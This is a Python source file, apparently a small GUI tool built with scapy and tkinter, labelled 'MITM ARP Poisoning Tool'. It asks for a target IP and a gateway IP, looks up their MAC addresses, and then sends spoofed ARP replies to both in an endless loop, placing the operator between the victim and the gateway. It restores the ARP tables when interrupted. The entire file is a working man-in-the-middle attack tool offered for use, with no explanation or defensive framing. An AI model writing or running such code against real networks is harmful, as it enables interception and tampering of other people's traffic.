from scapy.all import *
from tkinter import *
from time import *


def getMacAddr(targetIP):
    pkt = Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 1, pdst = targetIP)
    targetMAC = srp(pkt, timeout = 2 , verbose = False)[0][0][1].hwsrc
    return targetMAC

def spoofARP(targetIP, targetMAC, sourceIP):
    spoofed = ARP(op = 2, pdst = targetIP, psrc = sourceIP, hwdst = targetMAC)
    send(spoofed, verbose =  False)

def retablishARP(targetIP, targetMAC, sourceIP, sourceMAC):
    pkt = ARP(op = 2, hwsrc = sourceMAC, psrc = sourceIP, hwdst = targetMAC, pdst = targetIP)
    send(pkt, verbose = False)
    print("ARP Table restored to normal for", targetIP)

def main():

    targetIP = entry_target.get()
    gatewayIP = entry_gw.get()

    Title.destroy()
    label_target.destroy()
    label_gw.destroy()
    entry_target.destroy()
    entry_gw.destroy()
    button_launch.destroy()

    try:
        targetMAC = getMacAddr(targetIP)
        
    except:
        print("Nobody answer to ARP broadcast")
        quit()

    try:
        gatewayMAC = getMacAddr(gatewayIP)
        print("Gateway MAC:", gatewayMAC)
    except:
        print("Gateway is unreachable")
        quit()
    try:
        print("Sending spoofed ARP responses")
        while True:
            spoofARP(targetIP, targetMAC, gatewayIP)
            spoofARP(gatewayIP, gatewayMAC, targetIP)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        retablishARP(gatewayIP, gatewayMAC, targetIP, targetMAC)
        retablishARP(targetIP, targetMAC, gatewayIP, gatewayMAC)
        quit()
    



#Window creation with title

window = Tk()
window.title('MITM ARP Poisoning')
window['bg'] = 'grey'
#window.resizable(height = False, width = False)

#Creation on widgets

Title = Label(window, text = "MITM ARP Poisoning Tool", font = ("Helvetica", 24, "bold"))

label_target = Label(window, text = "Target IP : ")
label_gw = Label(window, text = "Gateway IP : ")

entry_target = Entry(window)
entry_gw = Entry(window)

button_launch = Button(window, text = "Launch", bg = 'white', command = main)


#Position of widgets

Title.grid(row = 0, column = 0, columnspan = 2, padx = 25, pady = (10,30), sticky = "we")

label_target.grid(row = 1, column = 0, padx = 5, pady = 10, sticky = "w")
label_gw.grid(row = 2, column = 0, padx = 5, pady = 10, sticky = "w")

entry_target.grid(row = 1, column = 1)
entry_gw.grid(row = 2, column = 1)

button_launch.grid(row = 3, column = 1, padx = 5, pady = 10, sticky = "e")

window.mainloop()

